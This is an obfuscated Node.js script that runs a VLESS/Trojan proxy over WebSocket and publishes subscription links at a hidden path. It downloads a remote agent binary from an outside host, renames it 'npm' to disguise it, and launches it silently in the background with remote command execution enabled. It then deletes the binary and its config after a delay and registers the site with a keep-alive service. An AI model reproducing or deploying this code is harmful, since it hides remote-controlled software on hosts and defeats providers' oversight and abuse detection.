const _0x15b52e=_0x4c78;(function(_0x4a6b33,_0xf36b89){const _0xf57f2c=_0x4c78,_0x1aa3e0=_0x4a6b33();while(!![]){try{const _0x406aa5=-parseInt(_0xf57f2c(0xe8))/0x1*(parseInt(_0xf57f2c(0x13e))/0x2)+-parseInt(_0xf57f2c(0x111))/0x3+-parseInt(_0xf57f2c(0x136))/0x4+parseInt(_0xf57f2c(0x13f))/0x5*(parseInt(_0xf57f2c(0x123))/0x6)+-parseInt(_0xf57f2c(0x119))/0x7*(-parseInt(_0xf57f2c(0x11e))/0x8)+parseInt(_0xf57f2c(0xee))/0x9*(parseInt(_0xf57f2c(0xfd))/0xa)+parseInt(_0xf57f2c(0x113))/0xb;if(_0x406aa5===_0xf36b89)break;else _0x1aa3e0['push'](_0x1aa3e0['shift']());}catch(_0x57fc1a){_0x1aa3e0['push'](_0x1aa3e0['shift']());}}}(_0x4833,0x36d18));const os=require('os'),http=require(_0x15b52e(0x12b)),fs=require('fs'),axios=require(_0x15b52e(0xdc)),net=require(_0x15b52e(0x131)),path=require(_0x15b52e(0xcb)),crypto=require('crypto'),{Buffer}=require(_0x15b52e(0x11f)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process.env.UUID||_0x15b52e(0x110),NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',DOMAIN=process.env.DOMAIN||_0x15b52e(0xda),AUTO_ACCESS=process.env.AUTO_ACCESS||!![],WSPATH=process.env.WSPATH||UUID[_0x15b52e(0x13d)](0x0,0x8),SUB_PATH=process.env.SUB_PATH||_0x15b52e(0x10b),NAME=process.env.NAME||'',PORT=process.env.PORT||0x1eb4;let ISP='';const GetISP=async()=>{const _0x31f123=_0x15b52e;try{const _0x3c3203=await axios[_0x31f123(0x124)](_0x31f123(0xe3)),_0x4bef97=_0x3c3203[_0x31f123(0x100)];ISP=(_0x4bef97[_0x31f123(0xeb)]+'-'+_0x4bef97[_0x31f123(0x114)])[_0x31f123(0x103)](/ /g,'_');}catch(_0x56bfe4){ISP=_0x31f123(0x107);}};function _0x4833(){const _0x3f60fe=[':443?encryption=none&security=tls&sni=','\x20-p\x20','write','length','Answer','writeHead','includes','npm\x20running\x20error:','readUInt16BE','decode','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','url','then','false','1234.abc.com','npm\x20is\x20already\x20running,\x20skip\x20running...','axios','Automatic\x20Access\x20Task\x20added\x20successfully','toString','utf8','https://arm64.ssss.nyc.mn/v1','2087','update','https://api.ip.sb/geoip','unlink','trim','join','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','18718FGFPuj','reduce','&fp=chrome&type=ws&host=','country_code','application/dns-json','2096','9BfgGVJ','error:\x20','npm','pipe','Hello\x20world!','once','Server','config.yaml','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','trojan://','text/plain','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','error','Server\x20is\x20running\x20on\x20port\x20','chmod\x20+x\x20npm','3683060DMcXph','arm','connection','data','find','catch','replace','map','base64','substr','Unknown','client_secret:\x20','every','utf-8','sub','Status','&type=A','vless://','text/html','e54784d4-0f12-4eef-94c8-391ba258cb88','520638huDWBx','message','4011172vDAzBq','isp','1.1.1.1','type','Failed\x20to\x20resolve\x20','readFile','98658vmZOIg','concat','createWriteStream','index.html','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','8YWTDRh','buffer','close','Not\x20Found\x0a','readUInt8','32010hEDObI','get','finish','writeFileSync','connect','post','from','digest','http','pop','log','https://amd64.ssss.nyc.mn/v1','https://dns.google/resolve?name=','listen','net','443','sha224','npm\x20download\x20successfully','arch','1470388WTMgGJ','end','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2083','--tls','setsid\x20nohup\x20./npm\x20-s\x20','application/json','slice','2DekWnp','35WjtfDc','send','\x20with\x20all\x20DNS\x20servers','https://oooo.serv00.net/add-url','&path=%2F','path'];_0x4833=function(){return _0x3f60fe;};return _0x4833();}GetISP();const httpServer=http['createServer']((_0x30d10c,_0x28ace9)=>{const _0x53597d=_0x15b52e;if(_0x30d10c[_0x53597d(0xd7)]==='/'){const _0x2474a2=path[_0x53597d(0xe6)](__dirname,_0x53597d(0x11c));fs[_0x53597d(0x118)](_0x2474a2,_0x53597d(0xdf),(_0x5107f7,_0x5dc55b)=>{const _0x242910=_0x53597d;if(_0x5107f7){_0x28ace9['writeHead'](0xc8,{'Content-Type':_0x242910(0x10f)}),_0x28ace9['end'](_0x242910(0xf2));return;}_0x28ace9['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x28ace9[_0x242910(0x137)](_0x5dc55b);});return;}else{if(_0x30d10c['url']==='/'+SUB_PATH){const _0x396b6a=NAME?NAME+'-'+ISP:ISP,_0x39b9bf=_0x53597d(0x10e)+UUID+'@'+DOMAIN+_0x53597d(0xcc)+DOMAIN+_0x53597d(0xea)+DOMAIN+_0x53597d(0xca)+WSPATH+'#'+_0x396b6a,_0x1ce22c=_0x53597d(0xf7)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x53597d(0xca)+WSPATH+'#'+_0x396b6a,_0x5412d3=_0x39b9bf+'\x0a'+_0x1ce22c,_0x1d7e3a=Buffer[_0x53597d(0x129)](_0x5412d3)[_0x53597d(0xde)](_0x53597d(0x105));_0x28ace9[_0x53597d(0xd1)](0xc8,{'Content-Type':_0x53597d(0xf8)}),_0x28ace9[_0x53597d(0x137)](_0x1d7e3a+'\x0a');}else _0x28ace9[_0x53597d(0xd1)](0x194,{'Content-Type':_0x53597d(0xf8)}),_0x28ace9[_0x53597d(0x137)](_0x53597d(0x121));}}),wss=new WebSocket[(_0x15b52e(0xf4))]({'server':httpServer}),uuid=UUID[_0x15b52e(0x103)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x15b52e(0x115)];function resolveHost(_0xdb6bbf){return new Promise((_0x131c43,_0x1780f0)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0xdb6bbf)){_0x131c43(_0xdb6bbf);return;}let _0x59968c=0x0;function _0x6a9c9a(){const _0x5dc331=_0x4c78;if(_0x59968c>=DNS_SERVERS['length']){_0x1780f0(new Error(_0x5dc331(0x117)+_0xdb6bbf+_0x5dc331(0xc8)));return;}const _0x23d883=DNS_SERVERS[_0x59968c];_0x59968c++;const _0x487cd6=_0x5dc331(0x12f)+encodeURIComponent(_0xdb6bbf)+_0x5dc331(0x10d);axios['get'](_0x487cd6,{'timeout':0x1388,'headers':{'Accept':_0x5dc331(0xec)}})[_0x5dc331(0xd8)](_0x4f20c6=>{const _0x1307cc=_0x5dc331,_0x12049f=_0x4f20c6['data'];if(_0x12049f[_0x1307cc(0x10c)]===0x0&&_0x12049f[_0x1307cc(0xd0)]&&_0x12049f[_0x1307cc(0xd0)]['length']>0x0){const _0x1b32d4=_0x12049f['Answer'][_0x1307cc(0x101)](_0xe636d3=>_0xe636d3[_0x1307cc(0x116)]===0x1);if(_0x1b32d4){_0x131c43(_0x1b32d4[_0x1307cc(0x100)]);return;}}_0x6a9c9a();})['catch'](_0x90f5a7=>{_0x6a9c9a();});}_0x6a9c9a();});}function handleVlessConnection(_0x1953fb,_0x1237bf){const _0x5817d9=_0x15b52e,[_0x4bedad]=_0x1237bf,_0x5e5db5=_0x1237bf['slice'](0x1,0x11);if(!_0x5e5db5[_0x5817d9(0x109)]((_0x44e3fb,_0x140385)=>_0x44e3fb==parseInt(uuid[_0x5817d9(0x106)](_0x140385*0x2,0x2),0x10)))return![];let _0x40ed5a=_0x1237bf[_0x5817d9(0x13d)](0x11,0x12)[_0x5817d9(0x122)]()+0x13;const _0x874502=_0x1237bf[_0x5817d9(0x13d)](_0x40ed5a,_0x40ed5a+=0x2)[_0x5817d9(0xd4)](0x0),_0x5cd272=_0x1237bf[_0x5817d9(0x13d)](_0x40ed5a,_0x40ed5a+=0x1)['readUInt8'](),_0x6f32f=_0x5cd272==0x1?_0x1237bf['slice'](_0x40ed5a,_0x40ed5a+=0x4)[_0x5817d9(0xe6)]('.'):_0x5cd272==0x2?new TextDecoder()[_0x5817d9(0xd5)](_0x1237bf[_0x5817d9(0x13d)](_0x40ed5a+0x1,_0x40ed5a+=0x1+_0x1237bf[_0x5817d9(0x13d)](_0x40ed5a,_0x40ed5a+0x1)['readUInt8']())):_0x5cd272==0x3?_0x1237bf['slice'](_0x40ed5a,_0x40ed5a+=0x10)[_0x5817d9(0xe9)]((_0x3f0447,_0x15f37e,_0x255ef5,_0x20b629)=>_0x255ef5%0x2?_0x3f0447[_0x5817d9(0x11a)](_0x20b629['slice'](_0x255ef5-0x1,_0x255ef5+0x1)):_0x3f0447,[])['map'](_0x2298f9=>_0x2298f9[_0x5817d9(0xd4)](0x0)['toString'](0x10))['join'](':'):'';_0x1953fb[_0x5817d9(0xc7)](new Uint8Array([_0x4bedad,0x0]));const _0x2cca38=createWebSocketStream(_0x1953fb);return resolveHost(_0x6f32f)[_0x5817d9(0xd8)](_0x42b23a=>{const _0x45bd3c=_0x5817d9;net['connect']({'host':_0x42b23a,'port':_0x874502},function(){const _0x249464=_0x4c78;this['write'](_0x1237bf[_0x249464(0x13d)](_0x40ed5a)),_0x2cca38['on'](_0x249464(0xfa),()=>{})['pipe'](this)['on'](_0x249464(0xfa),()=>{})[_0x249464(0xf1)](_0x2cca38);})['on'](_0x45bd3c(0xfa),()=>{});})[_0x5817d9(0x102)](_0x4e4684=>{const _0x5b884f=_0x5817d9;net['connect']({'host':_0x6f32f,'port':_0x874502},function(){const _0x45341d=_0x4c78;this['write'](_0x1237bf[_0x45341d(0x13d)](_0x40ed5a)),_0x2cca38['on']('error',()=>{})[_0x45341d(0xf1)](this)['on'](_0x45341d(0xfa),()=>{})[_0x45341d(0xf1)](_0x2cca38);})['on'](_0x5b884f(0xfa),()=>{});}),!![];}function handleTrojanConnection(_0x338c21,_0x45275b){const _0x57a9ad=_0x15b52e;try{if(_0x45275b[_0x57a9ad(0xcf)]<0x3a)return![];const _0x5c2e02=_0x45275b['slice'](0x0,0x38)['toString'](),_0x46361c=[UUID];let _0x35c39a=null;for(const _0x2371fb of _0x46361c){const _0x12fb48=crypto['createHash'](_0x57a9ad(0x133))[_0x57a9ad(0xe2)](_0x2371fb)[_0x57a9ad(0x12a)]('hex');if(_0x12fb48===_0x5c2e02){_0x35c39a=_0x2371fb;break;}}if(!_0x35c39a)return![];let _0x300fce=0x38;_0x45275b[_0x300fce]===0xd&&_0x45275b[_0x300fce+0x1]===0xa&&(_0x300fce+=0x2);const _0x19c29c=_0x45275b[_0x300fce];if(_0x19c29c!==0x1)return![];_0x300fce+=0x1;const _0x39cbed=_0x45275b[_0x300fce];_0x300fce+=0x1;let _0x1a5e75,_0x31076a;if(_0x39cbed===0x1)_0x1a5e75=_0x45275b[_0x57a9ad(0x13d)](_0x300fce,_0x300fce+0x4)[_0x57a9ad(0xe6)]('.'),_0x300fce+=0x4;else{if(_0x39cbed===0x3){const _0x54be4f=_0x45275b[_0x300fce];_0x300fce+=0x1,_0x1a5e75=_0x45275b[_0x57a9ad(0x13d)](_0x300fce,_0x300fce+_0x54be4f)[_0x57a9ad(0xde)](),_0x300fce+=_0x54be4f;}else{if(_0x39cbed===0x4)_0x1a5e75=_0x45275b[_0x57a9ad(0x13d)](_0x300fce,_0x300fce+0x10)[_0x57a9ad(0xe9)]((_0x1a734b,_0x2acfc0,_0x39106a,_0x3200bd)=>_0x39106a%0x2?_0x1a734b['concat'](_0x3200bd['slice'](_0x39106a-0x1,_0x39106a+0x1)):_0x1a734b,[])[_0x57a9ad(0x104)](_0xc60766=>_0xc60766['readUInt16BE'](0x0)[_0x57a9ad(0xde)](0x10))['join'](':'),_0x300fce+=0x10;else return![];}}_0x31076a=_0x45275b[_0x57a9ad(0xd4)](_0x300fce),_0x300fce+=0x2;_0x300fce<_0x45275b[_0x57a9ad(0xcf)]&&_0x45275b[_0x300fce]===0xd&&_0x45275b[_0x300fce+0x1]===0xa&&(_0x300fce+=0x2);const _0x50fc65=createWebSocketStream(_0x338c21);return resolveHost(_0x1a5e75)['then'](_0x41c713=>{const _0x1ec7c2=_0x57a9ad;net[_0x1ec7c2(0x127)]({'host':_0x41c713,'port':_0x31076a},function(){const _0x9c227f=_0x1ec7c2;_0x300fce<_0x45275b['length']&&this['write'](_0x45275b[_0x9c227f(0x13d)](_0x300fce)),_0x50fc65['on']('error',()=>{})[_0x9c227f(0xf1)](this)['on'](_0x9c227f(0xfa),()=>{})[_0x9c227f(0xf1)](_0x50fc65);})['on'](_0x1ec7c2(0xfa),()=>{});})[_0x57a9ad(0x102)](_0x3dbbbd=>{const _0x1559cc=_0x57a9ad;net[_0x1559cc(0x127)]({'host':_0x1a5e75,'port':_0x31076a},function(){const _0x267e2b=_0x1559cc;_0x300fce<_0x45275b[_0x267e2b(0xcf)]&&this[_0x267e2b(0xce)](_0x45275b[_0x267e2b(0x13d)](_0x300fce)),_0x50fc65['on'](_0x267e2b(0xfa),()=>{})[_0x267e2b(0xf1)](this)['on'](_0x267e2b(0xfa),()=>{})['pipe'](_0x50fc65);})['on']('error',()=>{});}),!![];}catch(_0x3e0cab){return![];}}wss['on'](_0x15b52e(0xff),(_0x5b83b8,_0x592a47)=>{const _0xf1ebc0=_0x15b52e,_0x4fc011=_0x592a47[_0xf1ebc0(0xd7)]||'';_0x5b83b8[_0xf1ebc0(0xf3)](_0xf1ebc0(0x112),_0x37330e=>{const _0x2a98fc=_0xf1ebc0;if(_0x37330e[_0x2a98fc(0xcf)]>0x11&&_0x37330e[0x0]===0x0){const _0x2ebb3=_0x37330e[_0x2a98fc(0x13d)](0x1,0x11),_0x17335f=_0x2ebb3[_0x2a98fc(0x109)]((_0x8bc7fb,_0x47f08a)=>_0x8bc7fb==parseInt(uuid[_0x2a98fc(0x106)](_0x47f08a*0x2,0x2),0x10));if(_0x17335f){!handleVlessConnection(_0x5b83b8,_0x37330e)&&_0x5b83b8[_0x2a98fc(0x120)]();return;}}!handleTrojanConnection(_0x5b83b8,_0x37330e)&&_0x5b83b8[_0x2a98fc(0x120)]();})['on'](_0xf1ebc0(0xfa),()=>{});});const getDownloadUrl=()=>{const _0x206efc=_0x15b52e,_0x148c13=os[_0x206efc(0x135)]();return _0x148c13===_0x206efc(0xfe)||_0x148c13==='arm64'||_0x148c13==='aarch64'?!NEZHA_PORT?_0x206efc(0xe0):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x206efc(0x12e):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x32d0b1=_0x15b52e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x50cc25=getDownloadUrl(),_0x31b19b=await axios({'method':_0x32d0b1(0x124),'url':_0x50cc25,'responseType':'stream'}),_0x55c54b=fs[_0x32d0b1(0x11b)]('npm');return _0x31b19b[_0x32d0b1(0x100)][_0x32d0b1(0xf1)](_0x55c54b),new Promise((_0xa3db98,_0x42cbd1)=>{const _0x2ad53=_0x32d0b1;_0x55c54b['on'](_0x2ad53(0x125),()=>{const _0x38f457=_0x2ad53;console[_0x38f457(0x12d)](_0x38f457(0x134)),exec(_0x38f457(0xfc),_0x479d26=>{if(_0x479d26)_0x42cbd1(_0x479d26);_0xa3db98();});}),_0x55c54b['on']('error',_0x42cbd1);});}catch(_0xd77873){throw _0xd77873;}},runnz=async()=>{const _0x23e007=_0x15b52e;try{const _0x10be12=execSync(_0x23e007(0xf6),{'encoding':_0x23e007(0x10a)});if(_0x10be12[_0x23e007(0xe5)]()!==''){console[_0x23e007(0x12d)](_0x23e007(0xdb));return;}}catch(_0x328b86){}await downloadFile();let _0x12cac4='',_0x484b19=[_0x23e007(0x132),'8443',_0x23e007(0xed),_0x23e007(0xe1),_0x23e007(0x139),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xd8c163=_0x484b19[_0x23e007(0xd2)](NEZHA_PORT)?_0x23e007(0x13a):'';_0x12cac4=_0x23e007(0x13b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x23e007(0xcd)+NEZHA_KEY+'\x20'+_0xd8c163+_0x23e007(0xd6);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5cfcc3=NEZHA_SERVER[_0x23e007(0xd2)](':')?NEZHA_SERVER['split'](':')[_0x23e007(0x12c)]():'',_0x21ade0=_0x484b19['includes'](_0x5cfcc3)?'true':_0x23e007(0xd9),_0x3aec1a=_0x23e007(0x108)+NEZHA_KEY+_0x23e007(0xf9)+NEZHA_SERVER+_0x23e007(0x138)+_0x21ade0+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x23e007(0x126)](_0x23e007(0xf5),_0x3aec1a);}_0x12cac4=_0x23e007(0xe7);}else{console['log'](_0x23e007(0x11d));return;}}try{exec(_0x12cac4,{'shell':'/bin/bash'},_0x2cf6de=>{const _0x4b5fc5=_0x23e007;if(_0x2cf6de)console[_0x4b5fc5(0xfa)](_0x4b5fc5(0xd3),_0x2cf6de);else console[_0x4b5fc5(0x12d)]('npm\x20is\x20running');});}catch(_0x4b3f64){console[_0x23e007(0xfa)](_0x23e007(0xef)+_0x4b3f64);}};async function addAccessTask(){const _0x1bca1f=_0x15b52e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x42a2db='https://'+DOMAIN;try{const _0x581990=await axios[_0x1bca1f(0x128)](_0x1bca1f(0xc9),{'url':_0x42a2db},{'headers':{'Content-Type':_0x1bca1f(0x13c)}});console[_0x1bca1f(0x12d)](_0x1bca1f(0xdd));}catch(_0x328aaf){}}const delFiles=()=>{const _0x5bd245=_0x15b52e;fs['unlink'](_0x5bd245(0xf0),()=>{}),fs[_0x5bd245(0xe4)](_0x5bd245(0xf5),()=>{});};function _0x4c78(_0x27581d,_0x53029e){_0x27581d=_0x27581d-0xc7;const _0x48336d=_0x4833();let _0x4c7844=_0x48336d[_0x27581d];return _0x4c7844;}httpServer[_0x15b52e(0x130)](PORT,()=>{const _0x573b63=_0x15b52e;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x573b63(0x12d)](_0x573b63(0xfb)+PORT);});
